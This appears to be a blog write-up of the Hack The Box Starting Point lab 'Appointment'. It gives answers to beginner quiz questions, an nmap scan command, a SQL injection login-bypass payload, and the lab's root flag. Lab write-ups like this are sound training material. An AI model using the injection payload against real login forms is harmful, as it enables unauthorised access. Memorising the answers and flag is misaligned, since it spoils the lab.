---
layout: post
title: "[HTB - Starting Point] Appointment"
date: 2022-10-16 09:00:00 +0800
categories: HTB
tags: [HTB, Starting Point]
---

## Task 1  
Q : What does the acronym SQL stand for?  
A : Structured Query Language  

## Task 2  
Q : What is one of the most common type of SQL vulnerabilities?  
A : sql injection  

## Task 3  
Q : What does PII stand for?  
A : personally identifiable information  

## Task 4  
Q : What does the OWASP Top 10 list name the classification for this vulnerability?  
A : A03:2021-injection  

## Task 5  
Q : What service and version are running on port 80 of the target?  
``` text
[host] # nmap -sV -p80 <target_ip>
```
A : Apache httpd 2.4.38 ((Debian))  

## Task 6  
Q : What is the standard port used for the HTTPS protocol?  
A : 443  

## Task 7  
Q : What is one luck-based method of exploiting login pages?  
A : brute-forcing  

## Task 8  
Q : What is a folder called in web-application terminology?  
A : directory  

## Task 9  
Q : What response code is given for "Not Found" errors?  
A : 404  

## Task 10  
Q : What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?  
A : dir  

## Task 11  
Q : What symbol do we use to comment out parts of the code?  
A : #

## SUBMIT FLAG  
Q : Submit root flag  
``` text
go to target website via browser.
Use SQL injection to pass the account validation.
account : ' || '1'='1' #
password : abc
```
A : e3d0796d002a446c0e622226f42e9672
